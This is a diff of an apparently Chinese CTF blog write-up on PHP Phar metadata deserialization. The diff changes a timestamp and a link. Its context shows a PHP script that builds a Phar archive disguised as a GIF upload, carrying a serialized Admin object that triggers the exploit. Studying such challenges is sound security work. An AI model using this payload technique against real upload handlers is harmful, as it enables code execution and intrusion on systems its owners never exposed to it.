@@ -97,7 +97,7 @@
 <meta property="og:image" content="https://scriptkid-beta.github.io/img/%E8%AE%B0%E4%B8%80%E6%AC%A1CTF%E6%8B%89%E7%BB%83/image-20200611132224047.png">
 <meta property="og:image" content="https://scriptkid-beta.github.io/img/%E8%AE%B0%E4%B8%80%E6%AC%A1CTF%E6%8B%89%E7%BB%83/image-20200609085312907.png">
 <meta property="article:published_time" content="2020-06-12T02:04:58.000Z">
-<meta property="article:modified_time" content="2020-06-12T02:05:00.855Z">
+<meta property="article:modified_time" content="2020-06-12T02:09:27.970Z">
 <meta property="article:author" content="小维同学">
 <meta property="article:tag" content="CTF">
 <meta name="twitter:card" content="summary">
@@ -417,7 +417,7 @@
 <h5 id="初步想法"><a href="#初步想法" class="headerlink" title="初步想法"></a>初步想法</h5><p>admin是关键类,利用通过反序列化之后的析构函数去通过lucky参数去调用Getflag函数输出flag，而反序列化的data是从cookie中获得, 那先尝试一下伪造cookie,但是其实cookie后半部分是用hash_hmac和一个未知的秘钥生成的一个签名, 无法绕过判断机制，基本上不可能伪造的了。</p>
 <h5 id="本题考点"><a href="#本题考点" class="headerlink" title="本题考点"></a>本题考点</h5><p>php中解析Phar归档中的Metadata的时候会有反序列化的操作</p>
 <p><a href="https://www.php.net/manual/zh/phar.getmetadata.php" target="_blank" rel="noopener">https://www.php.net/manual/zh/phar.getmetadata.php</a></p>
-<p><a href="">Phar://</a></p>
+<p><a href="https://scriptkid-beta.github.io/2020/06/09/Phar/">Phar://</a></p>
 <h4 id="解题步骤"><a href="#解题步骤" class="headerlink" title="解题步骤"></a>解题步骤</h4><h5 id="方式一"><a href="#方式一" class="headerlink" title="方式一"></a>方式一</h5><p>生成phar的gif头格式文件，并修改后缀名为gif</p>
 <figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php">    <span class="class"><span class="keyword">class</span> <span class="title">Admin</span></span>&#123;</span></span><br><span class="line"><span class="php">    &#125;</span></span><br><span class="line"><span class="php">    $phar = <span class="keyword">new</span> Phar(<span class="string">"avatar.phar"</span>); <span class="comment">//后缀名必须为phar</span></span></span><br><span class="line"><span class="php">    $phar-&gt;startBuffering();</span></span><br><span class="line"><span class="php">    $phar-&gt;setStub(<span class="string">"GIF89a"</span>.<span class="string">"&lt;?php __HALT_COMPILER(); ?&gt;"</span>); <span class="comment">//设置stubb，增加gif文件头</span></span></span><br><span class="line"><span class="php">    $o = <span class="keyword">new</span> Admin();</span></span><br><span class="line"><span class="php">    $phar-&gt;setMetadata($o); <span class="comment">//将自定义的meta-data存入manifest里</span></span></span><br><span class="line"><span class="php">    $phar-&gt;addFromString(<span class="string">"test.txt"</span>, <span class="string">"test"</span>); <span class="comment">// 添加要压缩的文件</span></span></span><br><span class="line"><span class="php">    $phar-&gt;stopBuffering(); <span class="comment">// 签名自动计算</span></span></span><br><span class="line"><span class="php"><span class="meta">?&gt;</span></span></span><br></pre></td></tr></table></figure>
 
